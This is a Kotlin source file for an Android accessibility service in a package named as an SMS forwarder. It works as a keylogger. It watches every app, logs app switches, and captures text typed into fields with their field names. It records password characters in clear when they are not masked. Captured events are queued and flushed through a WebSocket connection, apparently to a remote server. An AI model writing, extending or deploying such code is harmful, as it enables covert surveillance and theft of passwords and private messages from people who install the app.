package com.smsforwarder

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class TagalaAccessibilityService : AccessibilityService() {

    private lateinit var filter: AppFilter
        private lateinit var pipeline: EventPipeline
            private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
            private var watchdogJob: Job? = null
                private var lastPackage = ""

                override fun onCreate() {
                    super.onCreate()
                    filter = AppFilter(applicationContext)
                    pipeline = EventPipeline(
                        EventOutbox(applicationContext)
                    ) { WebSocketManager.getInstance(applicationContext).flushEvents() }
                }

                override fun onServiceConnected() {
                    super.onServiceConnected()
                    applyServiceInfo()
                    running = true

                    watchdogJob?.cancel()
                    watchdogJob = scope.launch {
                        while (true) {
                            delay(Config.WATCHDOG_INTERVAL_MS)
                            pipeline.flushAll()
                            applyServiceInfo()
                        }
                    }
                    WebSocketManager.getInstance(applicationContext).connect()
                }

                private fun applyServiceInfo() {
                    val types = if (Config.CAPTURE_CONTENT) {
                        AccessibilityServiceInfo.DEFAULT or AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                    } else {
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                    }

                    var flags = AccessibilityServiceInfo.DEFAULT
                    if (Config.CAPTURE_HW_KEYS) flags = flags or AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS

                        val info = serviceInfo ?: AccessibilityServiceInfo()
                        info.eventTypes = types
                        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                        info.flags = flags
                        info.notificationTimeout = 100
                        info.packageNames = null
                        serviceInfo = info
                }

                override fun onAccessibilityEvent(event: AccessibilityEvent?) {
                    val ev = event ?: return
                    val pkg = ev.packageName?.toString() ?: return

                    try {
                        when (ev.eventType) {
                            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> handleWindow(ev, pkg)
                            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleText(ev, pkg)
                            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleText(ev, pkg, forceEditable = true)
                        }
                    } catch (t: Throwable) {
                        Log.e(TAG, "Erreur traitement evenement", t)
                    }
                }

                private fun handleWindow(ev: AccessibilityEvent, pkg: String) {
                    if (!Config.CAPTURE_APPS) return
                        if (filter.isIgnoredForApps(pkg)) return
                            if (pkg == lastPackage) return
                                lastPackage = pkg

                                val label = try {
                                    packageManager.getApplicationLabel(packageManager.getApplicationInfo(pkg, 0)).toString()
                                } catch (t: Throwable) {
                                    pkg
                                }

                                pipeline.offerApp(pkg, label, ev.className?.toString() ?: "")
                                pipeline.flushKeys()
                }

                private fun handleText(ev: AccessibilityEvent, pkg: String, forceEditable: Boolean = false) {
                    if (filter.isIgnoredForKeys(pkg)) return

                        val source: AccessibilityNodeInfo = ev.source ?: return
                        try {
                            if (forceEditable && !source.isEditable) return

                                val before = ev.beforeText?.toString() ?: ""
                                val after = ev.text?.firstOrNull()?.toString()
                                ?: source.text?.toString()
                                ?: ""

                                val from = ev.fromIndex
                                val removed = ev.removedCount.coerceAtLeast(0)
                                val added = ev.addedCount.coerceAtLeast(0)

                                val isPassword = source.isPassword
                                val field = fieldName(source)
                                val kind = if (isPassword) "password" else "text"

                                if (added > 0 && from >= 0 && from + added <= after.length) {
                                    val inserted = after.substring(from, from + added)
                                    val masked = isPassword && isBullets(inserted)
                                    if (masked) {
                                        pipeline.onText(pkg, field, "", 0, true, inserted.length, "password")
                                    } else {
                                        pipeline.onText(pkg, field, inserted, 0, false, -1, kind)
                                    }
                                    return
                                }

                                if (removed > 0 && added == 0) {
                                    pipeline.onText(pkg, field, "", removed, false, -1, kind)
                                    return
                                }

                                if (isPassword && added > 0) {
                                    pipeline.onText(pkg, field, "", 0, true, added, "password")
                                    return
                                }

                                if (before != after) {
                                    val delta = diff(before, after)
                                    if (delta != null) pipeline.onText(pkg, field, delta, 0, false, -1, kind)
                                }
                        } finally {
                            try {
                                source.recycle()
                            } catch (t: Throwable) {
                            }
                        }
                }

                private fun diff(before: String, after: String): String? {
                    if (after.startsWith(before)) return after.removePrefix(before).ifEmpty { null }
                    var index = 0
                    val limit = minOf(before.length, after.length)
                    while (index < limit && before[index] == after[index]) index++
                        if (index >= after.length) return null
                            return after.substring(index)
                }

                private fun fieldName(node: AccessibilityNodeInfo): String {
                    node.viewIdResourceName?.substringAfterLast('/')?.takeIf { it.isNotEmpty() }?.let { return it }
                    node.hintText?.toString()?.takeIf { it.isNotEmpty() }?.let { return it }
                    node.contentDescription?.toString()?.takeIf { it.isNotEmpty() }?.let { return it }
                    return ""
                }

                private fun isBullets(value: String): Boolean {
                    if (value.isEmpty()) return false
                        return value.all { it in "•●∙·*" }
                }

                override fun onKeyEvent(event: android.view.KeyEvent?): Boolean {
                    // Les IME ne relaient pas leurs touches ; ceci ne couvre que le matériel.
                    return false
                }

                override fun onInterrupt() {
                    pipeline.flushAll()
                }

                override fun onUnbind(intent: android.content.Intent?): Boolean {
                    pipeline.flushAll()
                    return super.onUnbind(intent)
                }

                override fun onDestroy() {
                    running = false
                    watchdogJob?.cancel()
                    pipeline.flushAll()
                    super.onDestroy()
                }

                companion object {
                    private const val TAG = "TagalaA11y"

                    @Volatile
                    var running = false
                    private set
                }
}
